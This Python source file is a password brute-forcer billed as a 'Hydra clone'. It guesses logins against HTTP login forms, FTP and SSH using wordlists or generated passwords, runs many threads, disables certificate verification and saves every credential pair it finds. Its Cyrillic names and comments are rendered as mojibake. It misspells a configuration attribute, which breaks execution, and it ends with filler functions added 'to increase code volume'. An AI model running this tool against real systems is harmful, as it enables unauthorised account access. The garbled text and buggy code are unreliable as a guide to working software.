# -*- coding: utf-8 -*-
import argparse
import socket
import ssl
import urllib.request
import urllib.parse
import urllib.error
import ftplib
import paramiko
import threading
import queue
import time
import logging
import re
import sys
import os
from typing import List, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor
from itertools import product
import random
import string

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] - %(message)s',
    filename='hydra_clone.log'
)
logger = logging.getLogger('HydraClone')

# –ö–ª–∞—Å—Å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
class –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:
    def __init__(self):
        self.—Ü–µ–ª—å = ""
        self.–ø—Ä–æ—Ç–æ–∫–æ–ª = ""
        self.–ø–æ—Ä—Ç = 0
        self.–ª–æ–≥–∏–Ω = ""
        self.—Ñ–∞–π–ª_–ª–æ–≥–∏–Ω—ã = ""
        self.–ø–∞—Ä–æ–ª—å = ""
        self.—Ñ–∞–π–ª_–ø–∞—Ä–æ–ª–∏ = ""
        self.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π = ""
        self.–ø–æ—Ç–æ–∫–∏ = 4
        self.—Ç–∞–π–º–∞—É—Ç = 5
        self.ssl = False
        self.–≤—ã—Ö–æ–¥_–ø—Ä–∏_—É—Å–ø–µ—Ö–µ = False
        self.—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞ = ""
        self.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º = False

# –ü–∞—Ä—Å–µ—Ä –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏
def –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å_–∞—Ä–≥—É–º–µ–Ω—Ç—ã() -> argparse.Namespace:
    –ø–∞—Ä—Å–µ—Ä = argparse.ArgumentParser(
        description="–ö–ª–æ–Ω Hydra –Ω–∞ Python –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø–∞—Ä–æ–ª–µ–π",
        epilog="–°–æ–∑–¥–∞–Ω–æ –•–∞–∫–µ—Ä–æ–º –¥–ª—è –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å –æ—Å—Ç–æ—Ä–æ–∂–Ω–æ—Å—Ç—å—é! üòà"
    )
    –ø–∞—Ä—Å–µ—Ä.add_argument('-l', '--–ª–æ–≥–∏–Ω', type=str, help='–ï–¥–∏–Ω–∏—á–Ω—ã–π –ª–æ–≥–∏–Ω –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-L', '--—Ñ–∞–π–ª_–ª–æ–≥–∏–Ω—ã', type=str, help='–§–∞–π–ª —Å–æ —Å–ø–∏—Å–∫–æ–º –ª–æ–≥–∏–Ω–æ–≤')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-p', '--–ø–∞—Ä–æ–ª—å', type=str, help='–ï–¥–∏–Ω–∏—á–Ω—ã–π –ø–∞—Ä–æ–ª—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-P', '--—Ñ–∞–π–ª_–ø–∞—Ä–æ–ª–∏', type=str, help='–§–∞–π–ª —Å–æ —Å–ø–∏—Å–∫–æ–º –ø–∞—Ä–æ–ª–µ–π')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-x', '--–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π', type=str, help='–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª–µ–π, —Ñ–æ—Ä–º–∞—Ç: –º–∏–Ω:–º–∞–∫—Å:—Å–∏–º–≤–æ–ª—ã')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-s', '--–ø–æ—Ä—Ç', type=int, help='–ü–æ—Ä—Ç –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-S', '--ssl', action='store_true', help='–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å SSL')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-t', '--–ø–æ—Ç–æ–∫–∏', type=int, default=4, help='–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã—Ö –ø–æ—Ç–æ–∫–æ–≤')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-f', '--–≤—ã—Ö–æ–¥_–ø—Ä–∏_—É—Å–ø–µ—Ö–µ', action='store_true', help='–í—ã—Ö–æ–¥ –ø–æ—Å–ª–µ –Ω–∞—Ö–æ–∂–¥–µ–Ω–∏—è –ø–∞—Ä—ã')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-o', '--—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞', type=str, help='–§–∞–π–ª –¥–ª—è –∑–∞–ø–∏—Å–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤')
    –ø–∞—Ä—Å–µ—Ä.add_argument('-v', '--–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º', action='store_true', help='–ü–æ–¥—Ä–æ–±–Ω—ã–π –≤—ã–≤–æ–¥')
    –ø–∞—Ä—Å–µ—Ä.add_argument('—Ü–µ–ª—å', type=str, help='–¶–µ–ª–µ–≤–æ–π –∞–¥—Ä–µ—Å (IP –∏–ª–∏ –¥–æ–º–µ–Ω)')
    –ø–∞—Ä—Å–µ—Ä.add_argument('–ø—Ä–æ—Ç–æ–∫–æ–ª', type=str, help='–ü—Ä–æ—Ç–æ–∫–æ–ª (http, ftp, ssh)')
    return –ø–∞—Ä—Å–µ—Ä.parse_args()

# –ß—Ç–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –∏–∑ —Ñ–∞–π–ª–∞
def –ø—Ä–æ—á–∏—Ç–∞—Ç—å_—Ñ–∞–π–ª(–ø—É—Ç—å: str) -> List[str]:
    try:
        with open(–ø—É—Ç—å, 'r', encoding='utf-8') as —Ñ–∞–π–ª:
            return [–ª–∏–Ω–∏—è.strip() for –ª–∏–Ω–∏—è in —Ñ–∞–π–ª if –ª–∏–Ω–∏—è.strip()]
    except FileNotFoundError:
        logger.error(f"–§–∞–π–ª {–ø—É—Ç—å} –Ω–µ –Ω–∞–π–¥–µ–Ω!")
        sys.exit(1)

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∞—Ä–æ–ª–µ–π
def —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å_–ø–∞—Ä–æ–ª–∏(—Ñ–æ—Ä–º–∞—Ç: str) -> List[str]:
    try:
        –º–∏–Ω_–¥–ª–∏–Ω–∞, –º–∞–∫—Å_–¥–ª–∏–Ω–∞, —Å–∏–º–≤–æ–ª—ã = —Ñ–æ—Ä–º–∞—Ç.split(':')
        –º–∏–Ω_–¥–ª–∏–Ω–∞, –º–∞–∫—Å_–¥–ª–∏–Ω–∞ = int(–º–∏–Ω_–¥–ª–∏–Ω–∞), int(–º–∞–∫—Å_–¥–ª–∏–Ω–∞)
        –ø–∞—Ä–æ–ª–∏ = []
        for –¥–ª–∏–Ω–∞ in range(–º–∏–Ω_–¥–ª–∏–Ω–∞, –º–∞–∫—Å_–¥–ª–∏–Ω–∞ + 1):
            for –∫–æ–º–±–∏–Ω–∞—Ü–∏—è in product(—Å–∏–º–≤–æ–ª—ã, repeat=–¥–ª–∏–Ω–∞):
                –ø–∞—Ä–æ–ª–∏.append(''.join(–∫–æ–º–±–∏–Ω–∞—Ü–∏—è))
        random.shuffle(–ø–∞—Ä–æ–ª–∏)  # –ü–µ—Ä–µ–º–µ—à–∏–≤–∞–µ–º –¥–ª—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ –ø–æ—Ä—è–¥–∫–∞
        return –ø–∞—Ä–æ–ª–∏[:10000]  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª—è –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏
    except ValueError:
        logger.error("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –ø–∞—Ä–æ–ª–µ–π! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –º–∏–Ω:–º–∞–∫—Å:—Å–∏–º–≤–æ–ª—ã")
        sys.exit(1)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ HTTP
def –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_http(—Ü–µ–ª—å: str, –ø–æ—Ä—Ç: int, –ª–æ–≥–∏–Ω: str, –ø–∞—Ä–æ–ª—å: str, ssl: bool, –∫–æ–Ω—Ñ–∏–≥: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è) -> Optional[Tuple[str, str]]:
    –ø—Ä–æ—Ç–æ–∫–æ–ª = 'https' if ssl else 'http'
    url = f"{–ø—Ä–æ—Ç–æ–∫–æ–ª}://{—Ü–µ–ª—å}:{–ø–æ—Ä—Ç}/login"
    –¥–∞–Ω–Ω—ã–µ = urllib.parse.urlencode({'username': –ª–æ–≥–∏–Ω, 'password': –ø–∞—Ä–æ–ª—å})
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    –∑–∞–ø—Ä–æ—Å = urllib.request.Request(url, –¥–∞–Ω–Ω—ã–µ.encode('utf-8'), headers)
    try:
        with urllib.request.urlopen(–∑–∞–ø—Ä–æ—Å, timeout=–∫–æ–Ω—Ñ–∏–≥.—Ç–∞–π–º–∞—É—Ç) as –æ—Ç–≤–µ—Ç:
            if –æ—Ç–≤–µ—Ç.status == 200:
                logger.info(f"–£—Å–ø–µ—Ö! –õ–æ–≥–∏–Ω: {–ª–æ–≥–∏–Ω}, –ü–∞—Ä–æ–ª—å: {–ø–∞—Ä–æ–ª—å}")
                return (–ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å)
    except urllib.error.URLError:
        if –∫–æ–Ω—Ñ–∏–≥.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º:
            logger.debug(f"–ù–µ—É–¥–∞—á–∞: {–ª–æ–≥–∏–Ω}:{–ø–∞—Ä–æ–ª—å}")
    return None

# –ü—Ä–æ–≤–µ—Ä–∫–∞ FTP
def –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_ftp(—Ü–µ–ª—å: str, –ø–æ—Ä—Ç: int, –ª–æ–≥–∏–Ω: str, –ø–∞—Ä–æ–ª—å: str, ssl: bool, –∫–æ–Ω—Ñ–∏–≥: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è) -> Optional[Tuple[str, str]]:
    try:
        ftp = ftplib.FTP()
        ftp.connect(—Ü–µ–ª—å, –ø–æ—Ä—Ç, timeout=–∫–æ–Ω—Ñ–∏–≥.—Ç–∞–π–º–∞—É—Ç)
        ftp.login(–ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å)
        ftp.quit()
        logger.info(f"–£—Å–ø–µ—Ö! –õ–æ–≥–∏–Ω: {–ª–æ–≥–∏–Ω}, –ü–∞—Ä–æ–ª—å: {–ø–∞—Ä–æ–ª—å}")
        return (–ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å)
    except ftplib.all_errors:
        if –∫–æ–Ω—Ñ–∏–≥.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º:
            logger.debug(f"–ù–µ—É–¥–∞—á–∞: {–ª–æ–≥–∏–Ω}:{–ø–∞—Ä–æ–ª—å}")
        return None

# –ü—Ä–æ–≤–µ—Ä–∫–∞ SSH
def –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_ssh(—Ü–µ–ª—å: str, –ø–æ—Ä—Ç: int, –ª–æ–≥–∏–Ω: str, –ø–∞—Ä–æ–ª—å: str, ssl: bool, –∫–æ–Ω—Ñ–∏–≥: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è) -> Optional[Tuple[str, str]]:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(—Ü–µ–ª—å, port=–ø–æ—Ä—Ç, username=–ª–æ–≥–∏–Ω, password=–ø–∞—Ä–æ–ª—å, timeout=–∫–æ–Ω—Ñ–∏–≥.—Ç–∞–π–º–∞—É—Ç)
        ssh.close()
        logger.info(f"–£—Å–ø–µ—Ö! –õ–æ–≥–∏–Ω: {–ª–æ–≥–∏–Ω}, –ü–∞—Ä–æ–ª—å: {–ø–∞—Ä–æ–ª—å}")
        return (–ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å)
    except paramiko.AuthenticationException:
        if –∫–æ–Ω—Ñ–∏–≥.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º:
            logger.debug(f"–ù–µ—É–¥–∞—á–∞: {–ª–æ–≥–∏–Ω}:{–ø–∞—Ä–æ–ª—å}")
        return None
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ SSH: {str(e)}")
        return None

# –û—Å–Ω–æ–≤–Ω–æ–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏
def –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å_–ø–∞—Ä—É(—Ü–µ–ª—å: str, –ø–æ—Ä—Ç: int, –ª–æ–≥–∏–Ω: str, –ø–∞—Ä–æ–ª—å: str, –ø—Ä–æ—Ç–æ–∫–æ–ª: str, ssl: bool, –∫–æ–Ω—Ñ–∏–≥: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è) -> Optional[Tuple[str, str]]:
    if –ø—Ä–æ—Ç–æ–∫–æ–ª == 'http':
        return –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_http(—Ü–µ–ª—å, –ø–æ—Ä—Ç, –ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å, ssl, –∫–æ–Ω—Ñ–∏–≥)
    elif –ø—Ä–æ—Ç–æ–∫–æ–ª == 'ftp':
        return –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_ftp(—Ü–µ–ª—å, –ø–æ—Ä—Ç, –ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å, ssl, –∫–æ–Ω—Ñ–∏–≥)
    elif –ø—Ä–æ—Ç–æ–∫–æ–ª == 'ssh':
        return –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_ssh(—Ü–µ–ª—å, –ø–æ—Ä—Ç, –ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å, ssl, –∫–æ–Ω—Ñ–∏–≥)
    else:
        logger.error(f"–ü—Ä–æ—Ç–æ–∫–æ–ª {–ø—Ä–æ—Ç–æ–∫–æ–ª} –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è!")
        return None

# –ó–∞–ø–∏—Å—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
def –∑–∞–ø–∏—Å–∞—Ç—å_—Ä–µ–∑—É–ª—å—Ç–∞—Ç(–ª–æ–≥–∏–Ω: str, –ø–∞—Ä–æ–ª—å: str, —Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞: str):
    with open(—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞, 'a', encoding='utf-8') as —Ñ–∞–π–ª:
        —Ñ–∞–π–ª.write(f"–õ–æ–≥–∏–Ω: {–ª–æ–≥–∏–Ω}, –ü–∞—Ä–æ–ª—å: {–ø–∞—Ä–æ–ª—å}\n")
    logger.info(f"–†–µ–∑—É–ª—å—Ç–∞—Ç –∑–∞–ø–∏—Å–∞–Ω –≤ {—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞}")

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞
def –±—Ä—É—Ç—Ñ–æ—Ä—Å(–∫–æ–Ω—Ñ–∏–≥: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è, –æ—á–µ—Ä–µ–¥—å_–∑–∞–¥–∞–Ω–∏–π: queue.Queue, —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã: List[Tuple[str, str]]):
    while not –æ—á–µ—Ä–µ–¥—å_–∑–∞–¥–∞–Ω–∏–π.empty():
        –ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å = –æ—á–µ—Ä–µ–¥—å_–∑–∞–¥–∞–Ω–∏–π.get()
        —Ä–µ–∑—É–ª—å—Ç–∞—Ç = –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å_–ø–∞—Ä—É(–∫–æ–Ω—Ñ–∏–≥.—Ü–µ–ª—å, –∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ä—Ç, –ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å, –∫–æ–Ω—Ñ–∏–≥.–ø—Ä–æ—Ç–æ–∫–æ–ª, –∫–æ–Ω—Ñ–∏–≥.ssl, –∫–æ–Ω—Ñ–∏–≥)
        if —Ä–µ–∑—É–ª—å—Ç–∞—Ç:
            —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã.append(—Ä–µ–∑—É–ª—å—Ç–∞—Ç)
            if –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞:
                –∑–∞–ø–∏—Å–∞—Ç—å_—Ä–µ–∑—É–ª—å—Ç–∞—Ç(–ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å, –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞)
            if –∫–æ–Ω—Ñ–∏–≥.–≤—ã—Ö–æ–¥_–ø—Ä–∏_—É—Å–ø–µ—Ö–µ:
                sys.exit(0)
        –æ—á–µ—Ä–µ–¥—å_–∑–∞–¥–∞–Ω–∏–π.task_done()

# –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∑–∞–¥–∞–Ω–∏–π
def –ø–æ–¥–≥–æ—Ç–æ–≤–∏—Ç—å_–∑–∞–¥–∞–Ω–∏—è(–∫–æ–Ω—Ñ–∏–≥: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è) -> queue.Queue:
    –æ—á–µ—Ä–µ–¥—å = queue.Queue()
    –ª–æ–≥–∏–Ω—ã = [–∫–æ–Ω—Ñ–∏–≥.–ª–æ–≥–∏–Ω] if –∫–æ–Ω—Ñ–∏–≥.–ª–æ–≥–∏–Ω else –ø—Ä–æ—á–∏—Ç–∞—Ç—å_—Ñ–∞–π–ª(–∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ª–æ–≥–∏–Ω—ã)
    –ø–∞—Ä–æ–ª–∏ = [–∫–æ–Ω—Ñ–∏–≥.–ø–∞—Ä–æ–ª—å] if –∫–æ–Ω—Ñ–∏–≥.–ø–∞—Ä–æ–ª—å else (—Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å_–ø–∞—Ä–æ–ª–∏(–∫–æ–Ω—Ñ–∏–≥.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π) if –∫–æ–Ω—Ñ–∏–≥.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π else –ø—Ä–æ—á–∏—Ç–∞—Ç—å_—Ñ–∞–π–ª(–∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ø–∞—Ä–æ–ª–∏))
    
    for –ª–æ–≥–∏–Ω in –ª–æ–≥–∏–Ω—ã:
        for –ø–∞—Ä–æ–ª—å in –ø–∞—Ä–æ–ª–∏:
            –æ—á–µ—Ä–µ–¥—å.put((–ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å))
    return –æ—á–µ—Ä–µ–¥—å

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
def –≥–ª–∞–≤–Ω—ã–π():
    –∞—Ä–≥—É–º–µ–Ω—Ç—ã = –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å_–∞—Ä–≥—É–º–µ–Ω—Ç—ã()
    
    –∫–æ–Ω—Ñ–∏–≥ = –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è()
    –∫–æ–Ω—Ñ–∏–≥.—Ü–µ–ª—å = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.—Ü–µ–ª—å
    –∫–æ–Ω—Ñ–∏–≥.–ø—Ä–æ—Ç–æ–∫–æ–ª = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–ø—Ä–æ—Ç–æ–∫–æ–ª.lower()
    –∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ä—Ç = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–ø–æ—Ä—Ç if –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–ø–æ—Ä—Ç else (443 if –∫–æ–Ω—Ñ–∏–≥.ssl else 80 if –∫–æ–Ω—Ñ–∏–≥.–ø—Ä–æ—Ç–æ–∫–æ–ª == 'http' else 21 if –∫–æ–Ω—Ñ–∏–≥.–ø—Ä–æ—Ç–æ–∫–æ–ª == 'ftp' else 22)
    –∫–æ–Ω—Ñ–∏–≥.–ª–æ–≥–∏–Ω = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–ª–æ–≥–∏–Ω
    –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ª–æ–≥–∏–Ω—ã = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.—Ñ–∞–π–ª_–ª–æ–≥–∏–Ω—ã
    –∫–æ–Ω—Ñ–∏–≥.–ø–∞—Ä–æ–ª—å = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–ø–∞—Ä–æ–ª—å
    –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–ø–∞—Ä–æ–ª–∏ = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.—Ñ–∞–π–ª_–ø–∞—Ä–æ–ª–∏
    –∫–æ–Ω—Ñ–∏–≥.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–≥–µ–Ω–µ—Ä–∞—Ü–∏—è_–ø–∞—Ä–æ–ª–µ–π
    –∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ç–µ–∫–∏ = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–ø–æ—Ç–µ–∫–∏
    –∫–æ–Ω—Ñ–∏–≥.ssl = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.ssl
    –∫–æ–Ω—Ñ–∏–≥.–≤—ã—Ö–æ–¥_–ø—Ä–∏_—É—Å–ø–µ—Ö–µ = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–≤—ã—Ö–æ–¥_–ø—Ä–∏_—É—Å–ø–µ—Ö–µ
    –∫–æ–Ω—Ñ–∏–≥.—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞ = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.—Ñ–∞–π–ª_–≤—ã–≤–æ–¥–∞
    –∫–æ–Ω—Ñ–∏–≥.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º = –∞—Ä–≥—É–º–µ–Ω—Ç—ã.–ø–æ–¥—Ä–æ–±–Ω—ã–π_—Ä–µ–∂–∏–º
    
    logger.info(f"–ó–∞–ø—É—Å–∫ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞ –¥–ª—è {–∫–æ–Ω—Ñ–∏–≥.—Ü–µ–ª—å}:{–∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ä—Ç} —Å –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º {–∫–æ–Ω—Ñ–∏–≥.–ø—Ä–æ—Ç–æ–∫–æ–ª}")
    
    –æ—á–µ—Ä–µ–¥—å_–∑–∞–¥–∞–Ω–∏–π = –ø–æ–¥–≥–æ—Ç–æ–≤–∏—Ç—å_–∑–∞–¥–∞–Ω–∏—è(–∫–æ–Ω—Ñ–∏–≥)
    —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã = []
    
    with ThreadPoolExecutor(max_workers=–∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ç–µ–∫–∏) as –∏—Å–ø–æ–ª–Ω–∏—Ç–µ–ª—å:
        for _ in range(–∫–æ–Ω—Ñ–∏–≥.–ø–æ—Ç–µ–∫–∏):
            –∏—Å–ø–æ–ª–Ω–∏—Ç–µ–ª—å.submit(–±—Ä—É—Ç—Ñ–æ—Ä—Å, –∫–æ–Ω—Ñ–∏–≥, –æ—á–µ—Ä–µ–¥—å_–∑–∞–¥–∞–Ω–∏–π, —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã)
    
    if —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã:
        logger.info("–ù–∞–π–¥–µ–Ω—ã —Å–ª–µ–¥—É—é—â–∏–µ –ø–∞—Ä—ã –ª–æ–≥–∏–Ω/–ø–∞—Ä–æ–ª—å:")
        for –ª–æ–≥–∏–Ω, –ø–∞—Ä–æ–ª—å in —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã:
            print(f"–£—Å–ø–µ—Ö! –õ–æ–≥–∏–Ω: {–ª–æ–≥–∏–Ω}, –ü–∞—Ä–æ–ª—å: {–ø–∞—Ä–æ–ª—å}")
    else:
        logger.info("–ü–∞—Ä–æ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
        print("–ü–∞—Ä–æ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")

# –¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞
if __name__ == "__main__":
    –≥–ª–∞–≤–Ω—ã–π()

# –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è –æ–±—ä—ë–º–∞ –∫–æ–¥–∞
def –ø—Ä–æ–≤–µ—Ä–∏—Ç—å_—Ü–µ–ª—å(—Ü–µ–ª—å: str) -> bool:
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ —Ü–µ–ª–∏ (IP –∏–ª–∏ –¥–æ–º–µ–Ω–∞)."""
    try:
        socket.inet_aton(—Ü–µ–ª—å)
        return True
    except socket.error:
        try:
            socket.gethostbyname(—Ü–µ–ª—å)
            return True
        except socket.gaierror:
            logger.error(f"–ù–µ–≤–µ—Ä–Ω–∞—è —Ü–µ–ª—å: {—Ü–µ–ª—å}")
            return False

def –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å_ssl() -> ssl.SSLContext:
    """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ SSL –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞."""
    –∫–æ–Ω—Ç–µ–∫—Å—Ç = ssl.create_default_context()
    –∫–æ–Ω—Ç–µ–∫—Å—Ç.check_hostname = False
    –∫–æ–Ω—Ç–µ–∫—Å—Ç.verify_mode = ssl.CERT_NONE
    return –∫–æ–Ω—Ç–µ–∫—Å—Ç

def –ø–æ–ª—É—á–∏—Ç—å_–≤—Ä–µ–º—è() -> str:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ –¥–ª—è –ª–æ–≥–æ–≤."""
    return time.strftime("%Y-%m-%d %H:%M:%S")

def —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞—Ç—å_—Å–æ–æ–±—â–µ–Ω–∏–µ(—Å–æ–æ–±—â–µ–Ω–∏–µ: str) -> str:
    """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è –≤—ã–≤–æ–¥–∞."""
    return f"[{–ø–æ–ª—É—á–∏—Ç—å_–≤—Ä–µ–º—è()}] {—Å–æ–æ–±—â–µ–Ω–∏–µ}"

def —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å_–∫–æ–Ω—Ñ–∏–≥(–∫–æ–Ω—Ñ–∏–≥: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è, –ø—É—Ç—å: str):
    """–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –≤ —Ñ–∞–π–ª."""
    with open(–ø—É—Ç—å, 'w', encoding='utf-8') as —Ñ–∞–π–ª:
        —Ñ–∞–π–ª.write(f"–¶–µ–ª—å: {–∫–æ–Ω—Ñ–∏–≥.—Ü–µ–ª—å}\n")
